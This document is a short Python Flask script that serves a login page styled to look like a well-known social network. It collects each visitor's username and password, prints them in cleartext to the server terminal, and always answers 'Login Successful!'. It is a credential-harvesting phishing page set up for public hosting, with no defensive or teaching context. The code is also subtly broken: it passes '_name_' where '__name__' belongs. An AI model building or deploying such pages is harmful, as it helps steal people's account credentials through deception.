from flask import Flask, request, render_template_string
import os

app = Flask(_name_)
html_code = """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        h2 {
            color: #1877f2;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            background-color: #1877f2;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #166fe5;
        }
        .forgot {
            display: block;
            margin-top: 15px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Website Logo</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <a href="#" class="forgot">Forgot Password?</a>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(html_code)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    print(f"Username: {username}, Password: {password}") # Terminal ထဲမှာ ပေါ်လာဖို့
    return "Login Successful!"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
    
